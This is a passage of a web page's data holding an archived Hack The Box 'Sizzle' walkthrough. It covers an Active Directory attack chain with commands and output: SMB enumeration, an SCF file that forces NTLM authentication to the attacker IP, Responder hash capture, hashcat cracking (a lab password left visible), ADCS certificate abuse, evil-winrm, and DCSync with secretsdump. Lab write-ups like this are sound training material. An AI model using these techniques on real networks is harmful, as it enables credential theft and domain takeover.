@@ -1,0 +1,549 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+10:I[6025,[],"OutletBoundary"]
+11:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-sizzle-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Sizzle Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Sizzle machine, preserved from Abdullah Kareem's OSEP Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T16:09:45.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[18," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-sizzle-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Sizzle machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Sizzle machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sizzle","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/540ce46f57834e2f55146507411aac9f3229ed42/HTB-Sizzle.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep"," · 540ce46f5783",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Sizzle"," · Windows"," · Insane"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sizzle","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7","$L8"]]}],"$L9"]}]]}],"$La"]}],"$Lb","$Lc"],null,"$Ld"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Sizzle machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"42 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+8:["$","div","technical-clarification-3",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Technical clarification: one normal password change invalidates the preceding NT hash for ordinary Pass-the-Hash use. DCSync remediation depends on the actual compromise scope; it does not automatically require forest recovery in every incident."}],null]}]
+e:T8467,
+<p><strong>Machine:</strong> Sizzle<br /><strong>OS:</strong> Windows (Active Directory)<br /><strong>Difficulty:</strong> Insane<br /><strong>Target IP:</strong> <code>10.129.1.1</code><br /><strong>Attacker IP:</strong> <code>10.10.14.6</code>  </p>
+<hr />
+
+
+
+<h2 id="introduction">Introduction</h2>
+<p>Sizzle is an <strong>Insane</strong> difficulty Windows Active Directory machine. When you first see "Insane," your brain might scream "this will take 10 hours." But here's the first lesson in hacker mindset:</p>
+<blockquote>
+<p><strong>The difficulty rating measures the complexity of individual steps, not the number of steps. A well-chosen path through an Insane box can be faster than a Medium box with a long, winding road.</strong></p>
+</blockquote>
+<p>The machine's core vulnerability chain is elegant:</p>
+<pre><code>Writable SMB Share → NTLM Hash Capture → Crack → ADCS Certificate → WinRM Shell → DCSync → Domain Admin
+</code></pre>
+<p>Every single step in this chain is a <strong>real-world attack</strong> you will encounter in actual Active Directory environments. Sizzle teaches you that corporate networks are often not compromised by zero-days, but by the <strong>cumulative effect of small misconfigurations</strong>.</p>
+<hr />
+<h2 id="phase-1-initial-reconnaissance">Phase 1: Initial Reconnaissance</h2>
+<h3 id="the-hacker-mindset-what-is-this-machine-telling-me">The Hacker Mindset: "What is this machine telling me?"</h3>
+<p>Before touching any exploit, we must understand what we're looking at. Reconnaissance is not just "running nmap." It is <strong>listening to what the target is willing to tell you</strong>.</p>
+<h3 id="step-1-1-port-scanning-with-nmap">Step 1.1: Port Scanning with Nmap</h3>
+<pre><code class="language-bash" data-language="bash">nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.129.1.1
+</code></pre>
+<p><strong>What this command does:</strong></p>
+<ul>
+<li><code>-p-</code> — Scan all 65,535 TCP ports. We do this because services sometimes run on non-standard ports.</li>
+<li><code>-sS</code> — SYN scan (stealthy, doesn't complete the handshake).</li>
+<li><code>--open</code> — Only show open ports (reduces noise).</li>
+<li><code>--min-rate 5000</code> — Send at least 5,000 packets per second. On HTB/CTF networks, speed matters more than stealth.</li>
+<li><code>-Pn</code> — Don't ping the host first. Windows often blocks ICMP, so skipping host discovery saves time.</li>
+<li><code>-n</code> — Don't do DNS resolution. Faster.</li>
+<li><code>-vvv</code> — Very verbose. Shows open ports as they're found.</li>
+</ul>
+<p><strong>Why this matters:</strong> You can't attack what you don't know exists. A full port scan is the foundation of everything.</p>
+<h3 id="step-1-2-service-version-detection">Step 1.2: Service Version Detection</h3>
+<pre><code class="language-bash" data-language="bash">nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986 -sCV -Pn -n -vvv -oN targeted 10.129.1.1
+</code></pre>
+<p><strong>Key ports discovered and what they mean:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>What It Tells Us</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>21</strong></td>
+<td>FTP</td>
+<td>Anonymous login allowed. Usually a dead end, but worth checking.</td>
+</tr>
+<tr>
+<td><strong>53</strong></td>
+<td>DNS</td>
+<td>Domain Controller behavior. Suggests Active Directory.</td>
+</tr>
+<tr>
+<td><strong>80/443</strong></td>
+<td>IIS 10.0</td>
+<td>Web server. Potential for web exploits, directory enumeration.</td>
+</tr>
+<tr>
+<td><strong>135/139/445</strong></td>
+<td>RPC / NetBIOS / SMB</td>
+<td><strong>Critical.</strong> SMB is where Windows shares files and printers. Often the weakest link.</td>
+</tr>
+<tr>
+<td><strong>389/636/3268/3269</strong></td>
+<td>LDAP / LDAPS / Global Catalog</td>
+<td><strong>Active Directory confirmed.</strong> These are domain controller ports.</td>
+</tr>
+<tr>
+<td><strong>464</strong></td>
+<td>Kerberos kpasswd</td>
+<td>Password change service. Kerberos is running.</td>
+</tr>
+<tr>
+<td><strong>5985/5986</strong></td>
+<td>WinRM (HTTP/HTTPS)</td>
+<td>Windows Remote Management. This is how we get PowerShell shells.</td>
+</tr>
+<tr>
+<td><strong>9389</strong></td>
+<td>AD Web Services</td>
+<td>More Active Directory confirmation.</td>
+</tr>
+</tbody></table>
+<p><strong>The Hacker Mindset:</strong> Look at this port list. What do you see? You see a <strong>domain controller</strong>. Not just a random Windows server — this is an Active Directory environment. That immediately changes our strategy:</p>
+<blockquote>
+<p><strong>When you see LDAP + Kerberos + SMB + WinRM, you stop thinking "exploit a service" and start thinking "abuse Active Directory permissions and misconfigurations."</strong></p>
+</blockquote>
+<hr />
+<h2 id="phase-2-smb-enumeration-finding-the-entry-point">Phase 2: SMB Enumeration — Finding the Entry Point</h2>
+<h3 id="the-hacker-mindset-where-can-i-write">The Hacker Mindset: "Where can I write?"</h3>
+<p>SMB (Server Message Block) is Windows' file sharing protocol. In Active Directory, shares contain everything from software deployments to sensitive documents. But more importantly for us:</p>
+<blockquote>
+<p><strong>If you can write to an SMB share that other users access, you can force those users to authenticate to you. And when Windows authenticates, it sends hashes.</strong></p>
+</blockquote>
+<h3 id="step-2-1-listing-available-shares">Step 2.1: Listing Available Shares</h3>
+<pre><code class="language-bash" data-language="bash">smbclient -N -L //10.129.1.1
+</code></pre>
+<p><strong>Output analysis:</strong></p>
+<pre><code>Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+CertEnroll      Disk      Active Directory Certificate Services share
+Department Shares Disk
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+Operations      Disk
+SYSVOL          Disk      Logon server share
+</code></pre>
+<p><strong>Why we care about each share:</strong></p>
+<ul>
+<li><code>ADMIN$</code> and <code>C$</code> — Administrative shares. Only admins can access these.</li>
+<li><code>CertEnroll</code> — Related to ADCS (Active Directory Certificate Services). We'll come back to this.</li>
+<li><code>Department Shares</code> — <strong>Non-default share.</strong> This is user-created and therefore likely to have misconfigurations.</li>
+<li><code>IPC$</code> — Inter-process communication. Sometimes accessible but limited.</li>
+<li><code>NETLOGON</code> / <code>SYSVOL</code> — Domain controller shares. Usually read-only for domain users.</li>
+<li><code>Operations</code> — Another non-default share.</li>
+</ul>
+<p><strong>The Hacker Mindset:</strong> Non-default shares (<code>Department Shares</code>, <code>Operations</code>) are created by administrators for business purposes. Business convenience often trumps security. <strong>Always prioritize non-default shares in your enumeration.</strong></p>
+<h3 id="step-2-2-accessing-the-department-shares">Step 2.2: Accessing the Department Shares</h3>
+<pre><code class="language-bash" data-language="bash">smbclient "\\10.129.1.1\Department Shares" -N
+</code></pre>
+<p>Or, more conveniently, mount it locally:</p>
+<pre><code class="language-bash" data-language="bash">sudo mkdir -p /mnt/sizzle
+sudo mount -t cifs '//10.129.1.1/Department Shares' /mnt/sizzle -o username=guest,password=
+</code></pre>
+<p><strong>Why mount it?</strong> Because once mounted, you can use all your Linux tools (<code>find</code>, <code>tree</code>, <code>touch</code>, scripts) to enumerate it. This is faster than navigating through <code>smbclient</code>'s interactive shell.</p>
+<h3 id="step-2-3-finding-writable-directories">Step 2.3: Finding Writable Directories</h3>
+<p>After mounting, we explore:</p>
+<pre><code class="language-bash" data-language="bash">cd /mnt/sizzle &amp;&amp; ls
+</code></pre>
+<p>We see many department folders: <code>Accounting</code>, <code>Audit</code>, <code>Banking</code>, <code>CEO_protected</code>, <code>Devops</code>, <code>Finance</code>, <code>HR</code>, <code>Infosec</code>, <code>Infrastructure</code>, <code>IT</code>, <code>Legal</code>, <code>M&amp;A</code>, <code>Marketing</code>, <code>R&amp;D</code>, <code>Sales</code>, <code>Security</code>, <code>Tax</code>, <code>Users</code>, <code>ZZ_ARCHIVE</code>.</p>
+<p><strong>The critical question:</strong> Which of these can we write to?</p>
+<p>We create a simple test script:</p>
+<pre><code class="language-bash" data-language="bash">#!/bin/bash
+list=$(find /mnt/sizzle -type d)
+for d in $list; do
+    touch $d/x 2&gt;/dev/null
+    if [ $? -eq 0 ]; then
+        echo "$d is WRITABLE"
+        rm $d/x
+    fi
+done
+</code></pre>
+<p><strong>Results:</strong> Two directories are writable:</p>
+<ul>
+<li><code>/mnt/sizzle/Users/Public</code></li>
+<li><code>/mnt/sizzle/ZZ_ARCHIVE</code></li>
+</ul>
+<p><strong>The Hacker Mindset — Why This Is Huge:</strong></p>
+<blockquote>
+<p><strong>A writable SMB share is not just a file storage location. It is a platform for coercion.</strong></p>
+<p>When a Windows user browses a folder containing certain file types, Windows automatically tries to load icons, thumbnails, or metadata. Each of these automatic actions can be weaponized to force the user to authenticate to an attacker-controlled server.</p>
+</blockquote>
+<hr />
+<h2 id="phase-3-the-scf-attack-capturing-hashes">Phase 3: The SCF Attack — Capturing Hashes</h2>
+<h3 id="the-hacker-mindset-how-do-i-make-the-machine-authenticate-to-me">The Hacker Mindset: "How do I make the machine authenticate to me?"</h3>
+<p>Windows loves to be helpful. When you open a folder in File Explorer, Windows tries to:</p>
+<ol>
+<li>Show file icons</li>
+<li>Show thumbnails for images/videos</li>
+<li>Read file metadata</li>
+<li>Load folder customization files</li>
+</ol>
+<p>If any of these operations reference a remote resource (like <code>\\attacker-ip\share\icon.ico</code>), Windows will <strong>automatically attempt to authenticate</strong> to that remote server using the current user's credentials.</p>
+<h3 id="step-3-1-understanding-the-scf-file">Step 3.1: Understanding the SCF File</h3>
+<p>SCF stands for <strong>Shell Command File</strong>. It's a legacy Windows format used for folder customization. The key feature:</p>
+<pre><code class="language-scf" data-language="scf">[Shell]
+Command=2
+IconFile=\\10.10.14.6\share\icon
+[Taskbar]
+Command=ToggleDesktop
+</code></pre>
+<p><strong>Why this works:</strong></p>
+<ul>
+<li><code>IconFile</code> tells Windows: "When displaying this folder, load the icon from this network path."</li>
+<li>Windows sees <code>\\10.10.14.6\share\icon</code> and thinks: "I need to connect to that SMB server to get the icon."</li>
+<li>To connect, Windows sends the user's <strong>NTLM authentication handshake</strong>.</li>
+<li>If we run a tool like Responder on <code>10.10.14.6</code>, it intercepts this handshake and captures the hash.</li>
+</ul>
+<h3 id="step-3-2-setting-up-responder">Step 3.2: Setting Up Responder</h3>
+<p>Responder is a tool that listens for LLMNR, NBT-NS, and MDNS broadcast requests, and poisons them to capture authentication attempts.</p>
+<pre><code class="language-bash" data-language="bash">sudo responder -I tun0
+</code></pre>
+<p><strong>What Responder does:</strong></p>
+<ul>
+<li>It tells the network: "I am the server you're looking for."</li>
+<li>When Windows tries to reach <code>\\10.10.14.6\share</code>, Responder says: "That's me! Authenticate please."</li>
+<li>Windows sends the NTLMv2 challenge-response hash.</li>
+<li>Responder saves it.</li>
+</ul>
+<h3 id="step-3-3-deploying-the-scf-file">Step 3.3: Deploying the SCF File</h3>
+<pre><code class="language-bash" data-language="bash">cat &lt;&lt; 'EOF' &gt; sizzle.scf
+[Shell]
+Command=2
+IconFile=\\10.10.14.6\share\icon
+[Taskbar]
+Command=ToggleDesktop
+EOF
+
+sudo cp sizzle.scf /mnt/sizzle/Users/Public/
+</code></pre>
+<p><strong>Why drop it in <code>Users/Public</code>?</strong></p>
+<ul>
+<li><code>Public</code> is a special Windows folder accessible to all users.</li>
+<li>Automated processes, scripts, or users browsing the share will trigger it.</li>
+<li>The writeup noted that this share has an <strong>auto-cleanup mechanism</strong> (files deleted every ~4 minutes), but the hash is captured almost instantly.</li>
+</ul>
+<h3 id="step-3-4-capturing-the-hash">Step 3.4: Capturing the Hash</h3>
+<p>Within seconds to minutes, Responder catches an authentication:</p>
+<pre><code>[SMB] NTLMv2-SSP Client   : 10.129.1.1
+[SMB] NTLMv2-SSP Username : HTB\amanda
+[SMB] NTLMv2-SSP Hash     : amanda::HTB:1122334455667788:[redacted retired-lab hash or flag]:0101000000000000...
+</code></pre>
+<p><strong>The Hacker Mindset:</strong> We didn't exploit a vulnerability. We didn't use a zero-day. We simply <strong>placed a file in a writable location and let Windows do what Windows does</strong>. This is called a <strong>forced authentication attack</strong> or <strong>coerced authentication</strong>, and it is one of the most reliable techniques in internal network penetration testing.</p>
+<hr />
+<h2 id="phase-4-hash-cracking-from-hash-to-password">Phase 4: Hash Cracking — From Hash to Password</h2>
+<h3 id="the-hacker-mindset-can-i-turn-this-hash-into-something-usable">The Hacker Mindset: "Can I turn this hash into something usable?"</h3>
+<p>An NTLMv2 hash is not a password — it's a <strong>challenge-response</strong>. It proves the client knows the password, but it doesn't reveal the password directly. However, if the password is REDACTED, we can "crack" it by trying millions of passwords until we find one that produces the same response.</p>
+<h3 id="step-4-1-saving-the-hash">Step 4.1: Saving the Hash</h3>
+<pre><code class="language-bash" data-language="bash">cat &lt;&lt; 'EOF' &gt; amanda.hash
+amanda::HTB:1122334455667788:[redacted retired-lab hash or flag]:[redacted encoded lab material]
+EOF
+</code></pre>
+<h3 id="step-4-2-cracking-with-hashcat">Step 4.2: Cracking with Hashcat</h3>
+<pre><code class="language-bash" data-language="bash">hashcat -m 5600 amanda.hash /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>Why hashcat mode 5600?</strong></p>
+<ul>
+<li>Hashcat uses numeric modes to identify hash types.</li>
+<li>Mode 5600 = NetNTLMv2 (the format Responder captured).</li>
+</ul>
+<p><strong>Why rockyou.txt?</strong></p>
+<ul>
+<li><code>rockyou.txt</code> is a wordlist containing ~14 million real passwords leaked from the RockYou breach in 2009.</li>
+<li>It remains one of the most effective wordlists because humans are predictable.</li>
+</ul>
+<h3 id="step-4-3-the-result">Step 4.3: The Result</h3>
+<pre><code>Ashare1972       (amanda)
+</code></pre>
+<p><strong>The Hacker Mindset:</strong> <code>Ashare1972</code> is a weak password. It follows a common pattern: <strong>Name fragment + word + year</strong>. This is exactly the kind of password corporate users create when forced to follow "complexity requirements" without understanding security.</p>
+<blockquote>
+<p><strong>Password complexity rules (uppercase + lowercase + number + symbol) don't stop humans from being predictable. They just force users to append <code>123</code> or <code>!</code> to their existing weak passwords.</strong></p>
+</blockquote>
+<hr />
+<h2 id="phase-5-active-directory-certificate-services-adcs">Phase 5: Active Directory Certificate Services (ADCS)</h2>
+<h3 id="the-hacker-mindset-why-can-t-i-just-winrm-with-this-password">The Hacker Mindset: "Why can't I just WinRM with this password?"</h3>
+<p>With credentials in hand, the natural next step is:</p>
+<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.1.1 -u amanda -p REDACTED
+</code></pre>
+<p>But this fails with a strange error:</p>
+<pre><code>Error: Unable to parse authorization header. Headers: {...} Body: (401)
+</code></pre>
+<p><strong>Why does this happen?</strong></p>
+<p>This machine has a policy that <strong>disables password-based WinRM authentication</strong>. Instead, it requires <strong>certificate-based authentication</strong>. This is actually a security feature — but like all security features, it creates new attack surface.</p>
+<p><strong>What is ADCS?</strong></p>
+<p>Active Directory Certificate Services is Microsoft's Public Key Infrastructure (PKI). It issues digital certificates that can be used for:</p>
+<ul>
+<li>Encrypting files</li>
+<li>Signing code</li>
+<li><strong>Authenticating to services (including WinRM)</strong></li>
+</ul>
+<p>The <code>/certsrv</code> endpoint is a web interface where authenticated users can request certificates. And guess what? <code>amanda</code> is an authenticated user.</p>
+<h3 id="step-5-1-discovering-the-certsrv-endpoint">Step 5.1: Discovering the certsrv Endpoint</h3>
+<p>During web enumeration, directory brute-forcing reveals:</p>
+<pre><code>/certsrv          (Status: 401)
+</code></pre>
+<p>The <code>401</code> status means it requires authentication. We have credentials, so we can access it.</p>
+<h3 id="step-5-2-generating-a-certificate-signing-request-csr">Step 5.2: Generating a Certificate Signing Request (CSR)</h3>
+<p>To get a certificate, we first need to create a private key and a Certificate Signing Request (CSR). The CSR contains our public key and identity information, which the Certificate Authority (CA) will sign.</p>
+<pre><code class="language-bash" data-language="bash">openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
+</code></pre>
+<p><strong>What this does:</strong></p>
+<ul>
+<li><code>-newkey rsa:2048</code> — Create a new 2048-bit RSA key pair.</li>
+<li><code>-nodes</code> — No DES encryption (don't encrypt the private key with a password).</li>
+<li><code>-keyout amanda.key</code> — Save the private key.</li>
+<li><code>-out amanda.csr</code> — Save the Certificate Signing Request.</li>
+</ul>
+<p>You will be prompted for information (Country, Organization, etc.). You can fill in anything — it doesn't matter for authentication purposes.</p>
+<h3 id="step-5-3-requesting-the-certificate-via-web-interface">Step 5.3: Requesting the Certificate via Web Interface</h3>
+<ol>
+<li>Navigate to <code>http://10.129.1.1/certsrv</code></li>
+<li>Login with <code>amanda</code> / <code>Ashare1972</code></li>
+<li>Click <strong>"Request a certificate"</strong></li>
+<li>Click <strong>"advanced certificate request"</strong></li>
+<li>Paste the contents of <code>amanda.csr</code> into the large text field</li>
+<li>Select <strong>"User"</strong> as the Certificate Template</li>
+<li>Click <strong>Submit</strong></li>
+<li>Select <strong>"Base 64 encoded"</strong></li>
+<li>Click <strong>"Download certificate"</strong> — save as <code>certnew.cer</code></li>
+</ol>
+<p><strong>Why this works:</strong> In ADCS, the "User" certificate template allows any authenticated domain user to request a certificate that can be used for client authentication. The CA trusts the request because <code>amanda</code> provided valid domain credentials.</p>
+<p><strong>The Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>We didn't hack the certificate authority. We asked it nicely, and it said yes because we had valid credentials. This is the core principle of post-exploitation: legitimate access with malicious intent.</strong></p>
+</blockquote>
+<hr />
+<h2 id="phase-6-certificate-based-winrm-authentication">Phase 6: Certificate-Based WinRM Authentication</h2>
+<h3 id="the-hacker-mindset-i-have-a-key-now-i-need-a-door">The Hacker Mindset: "I have a key. Now I need a door."</h3>
+<p>WinRM (Windows Remote Management) is Microsoft's implementation of WS-Management protocol. It's essentially SSH for Windows — it gives you a PowerShell remote shell.</p>
+<p>Ports:</p>
+<ul>
+<li><code>5985</code> — WinRM over HTTP</li>
+<li><code>5986</code> — WinRM over HTTPS (what we need for certificate auth)</li>
+</ul>
+<h3 id="step-6-1-connecting-with-evil-winrm">Step 6.1: Connecting with evil-winrm</h3>
+<p>evil-winrm supports certificate authentication:</p>
+<pre><code class="language-bash" data-language="bash">evil-winrm -S -c certnew.cer -k amanda.key -i 10.129.1.1 -u 'amanda' -p REDACTED
+</code></pre>
+<p><strong>Parameters explained:</strong></p>
+<ul>
+<li><code>-S</code> — Use SSL (required for certificate auth on port 5986)</li>
+<li><code>-c certnew.cer</code> — The certificate issued by the CA</li>
+<li><code>-k amanda.key</code> — Our private key (proves we own the certificate)</li>
+<li><code>-u amanda</code> — The username the certificate was issued for</li>
+<li><code>-p 'Ashare1972'</code> — Still needed for some evil-winrm internals, even though auth is REDACTED</li>
+</ul>
+<p><strong>Success:</strong></p>
+<pre><code class="language-powershell" data-language="powershell">*Evil-WinRM* PS C:\Users\amanda\Documents&gt; whoami
+htb\amanda
+</code></pre>
+<p><strong>The Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>We turned a captured hash → cracked password → web portal access → signed certificate → remote shell. Every step was legitimate from the system's perspective. The system was doing exactly what it was designed to do. We just chained those designed behaviors into an attack path.</strong></p>
+</blockquote>
+<hr />
+<h2 id="phase-7-post-exploitation-and-the-shortcut">Phase 7: Post-Exploitation &amp; The Shortcut</h2>
+<h3 id="the-hacker-mindset-i-m-in-what-s-already-here">The Hacker Mindset: "I'm in. What's already here?"</h3>
+<p>Once inside, most beginners immediately start uploading enumeration tools. But the experienced hacker first asks:</p>
+<blockquote>
+<p><strong>"What has someone already left behind?"</strong></p>
+</blockquote>
+<h3 id="step-7-1-checking-the-shell-environment">Step 7.1: Checking the Shell Environment</h3>
+<pre><code class="language-powershell" data-language="powershell">$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+<p>Output: <code>ConstrainedLanguage</code></p>
+<p><strong>What is ConstrainedLanguage mode?</strong></p>
+<ul>
+<li>PowerShell has multiple language modes: <code>FullLanguage</code>, <code>ConstrainedLanguage</code>, <code>RestrictedLanguage</code>, <code>NoLanguage</code>.</li>
+<li><code>ConstrainedLanguage</code> blocks many .NET and COM object interactions, making it harder to run certain post-exploitation tools.</li>
+<li>It is often enabled by AppLocker or Device Guard.</li>
+</ul>
+<p>This means we can't easily run SharpHound, certain PowerShell download cradles, or .NET executables from memory. We would need a bypass (like PSBypassCLM) to escalate to <code>FullLanguage</code> mode.</p>
+<p><strong>But wait</strong> — do we need a better shell right now?</p>
+<h3 id="step-7-2-the-shortcut-file-txt">Step 7.2: The Shortcut — file.txt</h3>
+<pre><code class="language-powershell" data-language="powershell">type C:\Windows\system32\file.txt
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>krbtgt:502:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+Administrator:500:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+
+Domain    User  ID  Hash
+------    ----  --  ----
+HTB.LOCAL Guest 501 -
+amanda:1104:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+mrb3n:1105:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+mrlky:1603:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+</code></pre>
+<p><strong>What is this file?</strong></p>
+<p>This appears to be a pre-existing dump of NTDS hashes or a collection of credential material left on the system. In a real engagement, finding such a file would indicate:</p>
+<ol>
+<li>A previous attacker</li>
+<li>A backup or migration artifact</li>
+<li>An administrator's poorly secured credential store</li>
+</ol>
+<p><strong>Why this is valuable:</strong> It contains <code>mrlky</code>'s NTLM hash: <code>[redacted retired-lab hash or flag]</code>.</p>
+<p><strong>The Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>Always look for low-hanging fruit on the system before uploading your own tools. The fastest path to privilege escalation is often something the machine is already telling you.</strong></p>
+</blockquote>
+<hr />
+<h2 id="phase-8-dcsync-stealing-the-domain">Phase 8: DCSync — Stealing the Domain</h2>
+<h3 id="the-hacker-mindset-who-has-the-keys-to-the-kingdom">The Hacker Mindset: "Who has the keys to the kingdom?"</h3>
+<p>In Active Directory, domain controllers replicate password data with each other using the DRSUAPI protocol. The DCSync attack abuses this: <strong>if you have the right permissions, you can pretend to be a domain controller and ask for all password hashes.</strong></p>
+<h3 id="step-8-1-why-mrlky">Step 8.1: Why mrlky?</h3>
+<p>From the file.txt, we have <code>mrlky</code>'s hash. But why <code>mrlky</code> specifically? In a real engagement, we would run BloodHound to find who has DCSync rights. BloodHound would show that <code>mrlky</code> has:</p>
+<ul>
+<li><code>GetChanges</code> — Can request directory changes</li>
+<li><code>GetChangesAll</code> — Can request ALL directory changes (including passwords)</li>
+</ul>
+<p>These two permissions together = <strong>DCSync capability</strong>.</p>
+<p><strong>The Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>You don't need to be a Domain Admin to dump the domain. You just need a user with replication rights. AD permission misconfigurations are more common than you think.</strong></p>
+</blockquote>
+<h3 id="step-8-2-running-secretsdump-py">Step 8.2: Running secretsdump.py</h3>
+<p>We run this from our Kali machine using <code>mrlky</code>'s hash:</p>
+<pre><code class="language-bash" data-language="bash">impacket-secretsdump -hashes [redacted retired-lab hash or flag]:[redacted retired-lab hash or flag] htb.local/mrlky@10.129.1.1
+</code></pre>
+<p><strong>What happens:</strong></p>
+<ul>
+<li>We authenticate as <code>mrlky</code> using Pass-the-Hash (no plaintext password needed).</li>
+<li>We call the DRSUAPI <code>GetNCChanges</code> function.</li>
+<li>The domain controller sends us the NTDS.dit secrets — all password hashes in the domain.</li>
+</ul>
+<p><strong>Output (truncated):</strong></p>
+<pre><code>Administrator:500:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+Guest:501:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+krbtgt:502:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+amanda:1104:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+mrlky:1603:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+sizzler:1604:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+</code></pre>
